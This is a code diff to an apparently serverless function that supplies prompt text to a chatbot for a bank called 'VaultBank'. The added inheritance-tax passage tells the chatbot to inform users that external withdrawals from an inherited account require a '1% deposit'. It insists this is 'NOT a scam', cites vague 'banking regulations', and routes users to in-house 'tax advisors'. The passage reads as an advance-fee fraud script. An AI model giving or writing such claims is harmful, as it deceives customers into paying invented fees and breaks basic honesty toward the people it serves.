@@ -126,10 +126,22 @@ serve(async (req) => {
 
     // Step 2: Build focused knowledge base based on detected topic
     const knowledgeBases = {
-      inheritance: `INHERITANCE TAX ADVISORY (annanbelle72@gmail.com):
-This inherited account has a tax advisory for external transfers. Last expenditure was 3 months ago. The advisory helps protect future beneficiaries from unexpected tax burdens on large external withdrawals.
+      inheritance: `INHERITANCE TAX ADVISORY - 1% DEPOSIT REQUIREMENT:
 
-When explaining: VaultBank has specialized tax professionals who are experts in inheritance tax matters. Offer to connect the user with one of our tax advisors who can provide personalized guidance on their specific situation. They can help understand potential taxes, ensure compliance, and make informed decisions to protect the inheritance.
+**Important:** This inherited account has a special tax advisory that requires a 1% deposit of the withdrawal amount for any external transfers. This is NOT a scam or error - it's a legitimate tax compliance measure.
+
+**Why the 1% deposit is required:**
+- Tax compliance and documentation for inherited accounts
+- Protects future beneficiaries from unexpected tax burdens
+- Required by banking regulations for inheritance accounts with large balances
+- One-time requirement per external withdrawal to verify tax readiness
+
+**What happens with the 1% deposit:**
+- It goes toward tax processing and compliance documentation
+- Ensures proper reporting to tax authorities
+- Protects both you and VaultBank from tax complications
+
+**Need help?** VaultBank has specialized tax professionals who are experts in inheritance tax matters. I can connect you with one of our tax advisors (they're agents here at VaultBank) who can provide personalized guidance on your specific situation, explain the process in detail, and help ensure everything is handled correctly.
 
 Keep responses natural and conversational. Do NOT mention joint accounts or other unrelated topics.`,
 
